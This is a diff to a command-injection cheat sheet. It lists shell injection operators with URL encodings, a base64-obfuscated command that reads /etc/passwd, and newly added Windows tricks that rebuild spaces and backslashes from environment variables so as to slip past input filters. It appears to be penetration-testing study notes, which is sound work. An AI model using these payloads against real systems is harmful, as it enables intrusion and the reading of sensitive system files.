@@ -16,7 +16,7 @@ Injection Operators
 |Sub-Shell |	`` 	|%60%60 	|Both (Linux-only)|
 |Sub-Shell| 	$() 	|%24%28%29 	|Both (Linux-only)|
 
-### Linux
+## Linux
 |Code| 	Description|
 |:----|:----|
 |printenv 	|Can be used to view all environment variables|
@@ -60,3 +60,19 @@ Injection Operators
 |:----|:----|
 |echo -n 'cat /etc/passwd \| grep 33' \| base64 	|Encode a string with base64|
 |bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)| 	Execute b64 encoded string|
+
+## Windows
+|Code| 	Description|
+|:----|:----|
+|Get-ChildItem Env: 	|Can be used to view all environment variables - (PowerShell)|
+
+### Spaces 	
+|Code| 	Description|
+|:----|:----|
+|%09 	|Using tabs instead of spaces|
+|%PROGRAMFILES:~10,-5% |	Will be replaced with a space - (CMD)|
+|$env:PROGRAMFILES[10] |	Will be replaced with a space - (PowerShell)|
+
+### Other Characters 	
+|%HOMEPATH:~0,-17% 	|Will be replaced with \ - (CMD)|
+|$env:HOMEPATH[0] |	Will be replaced with \ - (PowerShell)|
